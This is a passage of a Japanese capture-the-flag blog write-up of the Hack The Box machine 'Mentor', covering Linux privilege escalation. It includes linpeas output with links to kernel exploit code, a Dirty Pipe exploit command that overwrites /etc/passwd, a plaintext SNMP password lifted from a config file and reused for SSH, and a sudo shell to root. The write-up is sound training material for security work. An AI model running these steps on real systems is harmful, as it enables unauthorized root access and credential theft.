2022/12/27 04:53:21 CMD: UID=0    PID=1236   | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2022/12/27 04:53:21 CMD: UID=0    PID=123    | 
2022/12/27 04:53:21 CMD: UID=0    PID=122    | 
2022/12/27 04:53:21 CMD: UID=114  PID=1217   | /usr/sbin/snmpd -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f 
2022/12/27 04:53:21 CMD: UID=0    PID=1215   | /usr/sbin/cron -f -P 
2022/12/27 04:53:21 CMD: UID=0    PID=121    | 
2022/12/27 04:53:21 CMD: UID=0    PID=120    | 
2022/12/27 04:53:21 CMD: UID=0    PID=12     | 
2022/12/27 04:53:21 CMD: UID=0    PID=119    | 
2022/12/27 04:53:21 CMD: UID=0    PID=118    | 
2022/12/27 04:53:21 CMD: UID=0    PID=117    | 
2022/12/27 04:53:21 CMD: UID=0    PID=116    | 
2022/12/27 04:53:21 CMD: UID=0    PID=115    | 
2022/12/27 04:53:21 CMD: UID=0    PID=114    | 
2022/12/27 04:53:21 CMD: UID=0    PID=113    | 
2022/12/27 04:53:21 CMD: UID=0    PID=112    | 
2022/12/27 04:53:21 CMD: UID=0    PID=111    | 
2022/12/27 04:53:21 CMD: UID=0    PID=110    | 
2022/12/27 04:53:21 CMD: UID=0    PID=11     | 
2022/12/27 04:53:21 CMD: UID=0    PID=109    | 
2022/12/27 04:53:21 CMD: UID=0    PID=108    | 
2022/12/27 04:53:21 CMD: UID=0    PID=107    | 
2022/12/27 04:53:21 CMD: UID=0    PID=106    | 
2022/12/27 04:53:21 CMD: UID=0    PID=105    | 
2022/12/27 04:53:21 CMD: UID=0    PID=104    | 
2022/12/27 04:53:21 CMD: UID=0    PID=103    | 
2022/12/27 04:53:21 CMD: UID=0    PID=102    | 
2022/12/27 04:53:21 CMD: UID=0    PID=101    | 
2022/12/27 04:53:21 CMD: UID=0    PID=100    | 
2022/12/27 04:53:21 CMD: UID=0    PID=10     | 
2022/12/27 04:53:21 CMD: UID=0    PID=1      | /sbin/init 
```
特段いい物はなさそう。

### linpeas
んじゃざっと色んな情報集めてみますよ。
ということでlinpeas使います。Linemunよりこっち派。
以下のサイトからlinpeas.shをダウンロードしてくる。

https://github.com/carlospolop/PEASS-ng/releases

pspy同様に攻撃対象サーバに転送させます。
んじゃ実行します。
```bash
svc@mentor:/tmp$ ./linpeas.sh 
```
すると以下のように「CVE-2022-0847」の「Dirty Pipe」の脆弱性の可能性があると言われている

```bash
...省略
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                            
Sudo version 1.9.9                                                                                                                                         

╔══════════╣ CVEs Check
Potentially Vulnerable to CVE-2022-0847                                                                                                                    

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                    
/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                    
New path exported: /home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Tue Dec 27 05:17:59 AM UTC 2022                                                                                                                            
 05:17:59 up 9 min,  1 user,  load average: 0.32, 0.16, 0.10

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                       
sda
sda1
sda2
sda3

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                  
/dev/disk/by-id/dm-uuid-LVM-xfXYN7cGl1W8E4X606fXxPFOTigYEvBGAe2tXCZglGJC1rce0sKyHwJQwJ5Wpz81 / ext4 defaults 0 1                                           
/dev/disk/by-uuid/9fb0ad47-8c34-486e-bc98-494a59c939ad /boot ext4 defaults 0 1
/dev/mapper/ubuntu--vg-swap     none    swap    sw      0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                    
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                            
HISTFILESIZE=0
USER=svc
SSH_CLIENT=10.10.14.75 33360 22
XDG_SESSION_TYPE=tty
SHLVL=1
MOTD_SHOWN=pam
HOME=/home/svc
OLDPWD=/home/svc
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
LOGNAME=svc
_=./linpeas.sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=1
PATH=/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
SSH_CONNECTION=10.10.14.75 33360 10.10.11.193 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                     
dmesg Not Found                                                                                                                                            
                                                                                                                                                           
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                         
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)                                                                                                       

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
...省略
```
## Dirty Pipe
以下のサイトを参考にコマンドを実行してみた。

https://github.com/Al1ex/CVE-2022-0847

```shell
cp /etc/passwd /tmp/passwd.bak
gcc exp.c -o exp
./exp /etc/passwd 1 ootz:
su rootz
```
![31.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2036848/2208bc40-2c00-3135-e38d-e8a95472f7b2.png)
だがうまくいかなかった。
別ルートの攻撃法を試す必要がありそうだ。

## snmpd.conf
`linpeas`の出力を再度見返すと以下のコンフィグを発見した。
```bash
...省略
╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation                                    
lrwxrwxrwx 1 root root 33 Jun  3  2022 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket                         
-rw-r--r-- 1 root root 175 Feb 10  2022 /usr/lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 0 Jun  3  2022 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket


╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf                                                                                              
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
-rw------- 1 Debian-snmp Debian-snmp 1268 Dec 27 05:09 /var/lib/snmp/snmpd.conf
...省略
```
上記の`snmpd.conf`はSNMPv3で認証を行う際のUserがCreateされている可能性がある。
もしクレデンシャルを拾えてなくても何かv3へのヒントでもあるかといったことでみてみた。

```bash
svc@mentor:/etc/snmp$ more snmpd.conf
###########################################################################
#
# snmpd.conf
# An example configuration file for configuring the Net-SNMP agent ('snmpd')
# See snmpd.conf(5) man page for details
#
###########################################################################
# SECTION: System Information Setup
#

# syslocation: The [typically physical] location of the system.
#   Note that setting this value here means that when trying to
#   perform an snmp SET operation to the sysLocation.0 variable will make
#   the agent return the "notWritable" error code.  IE, including
#   this token in the snmpd.conf file will disable write access to
#   the variable.
#   arguments:  location_string
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <admin@mentorquotes.htb>

# sysservices: The proper value for the sysServices object.
#   arguments:  sysservices_number
sysServices    72



###########################################################################
# SECTION: Agent Operating Mode
#
#   This section defines how the agent will operate when it
#   is running.

# master: Should the agent operate as a master agent or not.
#   Currently, the only supported master agent type for this t
#   is "agentx".
#   
#   arguments: (on|yes|agentx|all|off|no)

master  agentx

# agentaddress: The IP address and port number that the agent will listen on.
#   By default the agent listens to any and all traffic from any
#   interface on the default SNMP port (161).  This allows you to
#   specify which address, interface, transport type and port(s) that you
#   want the agent to listen on.  Multiple definitions of this token
#   are concatenated together (using ':'s).
#   arguments: [transport:]port[@interface/address],...

# agentaddress  127.0.0.1,[::1]
agentAddress udp:161,udp6:[::1]:161


###########################################################################
# SECTION: Access Control Setup
#
#   This section defines who is allowed to talk to your running
#   snmp agent.

# Views 
#   arguments viewname included [oid]

#  system + hrSystem groups only
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1


# rocommunity: a SNMPv1/SNMPv2c read-only access community name
#   arguments:  community [default|hostname|network/bits] [oid | -V view]

# Read-only access to everyone to the systemonly view
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly

# SNMPv3 doesn't use communities, but users with (optionally) an
# authentication and encryption string. This user needs to be created
# with what they can view with rouser/rwuser lines in this file.
#
# createUser username (MD5|SHA|SHA-512|SHA-384|SHA-256|SHA-224) authpassphrase [DES|AES] [privpassphrase]
# e.g.
# createuser authPrivUser SHA-512 myauthphrase AES myprivphrase
#
# This should be put into /var/lib/snmp/snmpd.conf 
#
# rouser: a SNMPv3 read-only access username
#    arguments: username [noauth|auth|priv [OID | -V VIEW [CONTEXT]]]
rouser authPrivUser authpriv -V systemonly

# include a all *.conf files in a directory
includeDir /etc/snmp/snmpd.conf.d


createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
#view SystemView included .1.3.6.1.2.1.1
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none
```
`createUser`で作成されている。以下の書式で記載されているのでPasswordは「SuperSecurePassword123__」となる。
> createUser ユーザー名　認証種別　認証パスワード　暗号化種別　暗号化パスワード

この情報をJamesに叩き込んでみた。

## SSH for james
sshで試してみる。
![32.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2036848/7dfb722a-2139-3d0a-2a14-ede1d8162bfc.png)
いった！！
とりあえず平行方向での特権昇格は完了である。

# Privilege Escalation - Vertical
## 情報収集
### sudo -l
```bash
james@mentor:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```
え、`/bin/sh`打てるのか？ならそのままいけるのでは...

## 実行
![33.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2036848/afb21f03-a702-21bc-13fa-f1a552458906.png)
いけてもうた。これで特権昇格完了である。

# まとめ
![スクリーンショット 2022-12-30 23.00.07.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2036848/9409768b-a073-9b1a-ceb5-4a0ed4d3a5db.png)

これで特権昇格に成功し、Root権限奪取に成功しました。
SNMPは俺得なプロトコルだったし、APIは設計の経験もありだったので、
apiのサブドメインを見つけてからはスイスイと攻略できた。
後半もSNMPv3の知識が必要となり、SNMPを知らなければちょっと難しいかなと思います。

今回もセキュリティエンジニアの皆さんの助けになればなと思います。
